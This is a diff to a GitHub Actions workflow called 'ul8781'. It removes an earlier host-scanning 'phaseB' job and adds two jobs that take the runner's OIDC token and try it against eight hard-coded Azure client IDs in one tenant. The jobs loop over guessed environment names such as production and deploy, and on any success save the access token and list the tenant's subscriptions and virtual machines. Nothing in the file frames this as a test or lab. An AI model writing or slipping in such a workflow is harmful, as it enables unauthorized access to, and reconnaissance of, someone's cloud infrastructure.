@@ -1,44 +1,71 @@
 name: ul8781
 on:
-  workflow_dispatch:
-    inputs:
-      ssh_limit:
-        description: hosts to touch (phase A)
-        default: "0"
   push:
-    branches: [main]
+  workflow_dispatch:
 permissions:
   id-token: write
-  contents: write
+  contents: read
 jobs:
-  phaseB:
-    if: github.event_name == 'workflow_dispatch' || contains(github.event.head_commit.message, 'ul8781')
+  noenv:
     runs-on: ubuntu-latest
-    timeout-minutes: 40
+    timeout-minutes: 12
     steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - name: http-census
-        env:
-          SSH_LIMIT: ${{ github.event.inputs.ssh_limit }}
-        run: |
-          python3 scripts/ul8781b.py || true
-          tail -70 res/logB.txt || true
-      - name: publish
-        if: always()
+      - name: exchange
         run: |
           set +e
-          git config user.email ul@local; git config user.name ul
-          mkdir -p out/ul8781
-          cp -r res/* out/ul8781/ 2>/dev/null
-          git add -f out/ul8781 res
-          git commit -m "ul8781 phaseB results"
-          git pull --rebase origin main
-          git push origin HEAD:main
-          git log --oneline -3
-      - uses: actions/upload-artifact@v4
-        if: always()
-        with:
-          name: ul8781-res
-          path: res
+          echo "CTX repo=$GITHUB_REPOSITORY ref=$GITHUB_REF event=$GITHUB_EVENT_NAME env=-"
+          O=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          OIDC=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#OIDC}"
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c; do
+          for CID in 032854b2-ba65-4dd6-bdd4-4e86b8756667 1459b1f6-7a5b-4300-93a2-44b4a651759f a1c42e17-82a8-41a5-906d-3eaca8b54607 abfa0a7c-a6b6-4736-8310-5855508787cd 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab f1996472-dd17-447c-bcdb-f8b76dd9b861 b9590f55-e173-495c-9010-15beb8611a43; do
+            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$CID -d scope=https://management.azure.com/.default -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
+            C=$(echo "$R" | grep -oE 'AADSTS[0-9]+' | head -1)
+            T=$(echo "$R" | python3 -c "import json,sys;d=json.load(sys.stdin);print(len(d.get('access_token','')))" 2>/dev/null || echo 0)
+            echo "RESULT env=- ${TEN:0:8} $CID ${C:-NONE} tok=${T:-0}"
+            if [ "${T:-0}" -gt 100 ]; then echo "$R" > tok.json; echo "$TEN $CID env=-" > winner.txt; fi
+          done
+          done
+          if [ -f tok.json ]; then
+            echo "=== WINNER $(cat winner.txt)"
+            T=$(python3 -c "import json;print(json.load(open('tok.json'))['access_token'])")
+            curl -s -m 30 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions?api-version=2022-12-01" -o subs.json
+            python3 -c "import json;d=json.load(open('subs.json'));[print('SUB',s['subscriptionId'],s['displayName'],s['state']) for s in d.get('value',[])]" 2>/dev/null
+            curl -s -m 60 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true" -o vms.json
+            python3 -c "import json;d=json.load(open('vms.json'));vs=d.get('value',[]);print('VMS',len(vs));[print('VM',v['name'],v['location'],(v['properties'].get('hardwareProfile') or {}).get('vmSize','')) for v in vs]" 2>/dev/null
+          else
+            echo NO_WINNER
+          fi
+  withenv:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    strategy:
+      fail-fast: false
+      matrix:
+        env: [production, prod, azure, deploy, ul]
+    environment: ${{ matrix.env }}
+    steps:
+      - name: exchange
+        run: |
+          set +e
+          echo "CTX env=${{ matrix.env }} repo=$GITHUB_REPOSITORY ref=$GITHUB_REF"
+          O=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          OIDC=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#OIDC}"
+          for CID in 032854b2-ba65-4dd6-bdd4-4e86b8756667 1459b1f6-7a5b-4300-93a2-44b4a651759f a1c42e17-82a8-41a5-906d-3eaca8b54607 abfa0a7c-a6b6-4736-8310-5855508787cd 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab f1996472-dd17-447c-bcdb-f8b76dd9b861 b9590f55-e173-495c-9010-15beb8611a43; do
+            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/e8adc959-bf67-48e0-95b4-318b5f73946c/oauth2/v2.0/token" -d grant_type=client_credentials -d client_id=$CID -d scope=https://management.azure.com/.default -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
+            C=$(echo "$R" | grep -oE 'AADSTS[0-9]+' | head -1)
+            T=$(echo "$R" | python3 -c "import json,sys;d=json.load(sys.stdin);print(len(d.get('access_token','')))" 2>/dev/null || echo 0)
+            echo "RESULT env=${{ matrix.env }} $CID ${C:-NONE} tok=${T:-0}"
+            if [ "${T:-0}" -gt 100 ]; then echo "$R" > tok.json; echo "$CID env=${{ matrix.env }}" > winner.txt; fi
+          done
+          if [ -f tok.json ]; then
+            echo "=== WINNER $(cat winner.txt)"
+            T=$(python3 -c "import json;print(json.load(open('tok.json'))['access_token'])")
+            curl -s -m 30 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions?api-version=2022-12-01" -o subs.json
+            python3 -c "import json;d=json.load(open('subs.json'));[print('SUB',s['subscriptionId'],s['displayName'],s['state']) for s in d.get('value',[])]" 2>/dev/null
+            curl -s -m 60 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true" -o vms.json
+            python3 -c "import json;d=json.load(open('vms.json'));vs=d.get('value',[]);print('VMS',len(vs));[print('VM',v['name'],v['location'],(v['properties'].get('hardwareProfile') or {}).get('vmSize','')) for v in vs]" 2>/dev/null
+          else
+            echo NO_WINNER
+          fi
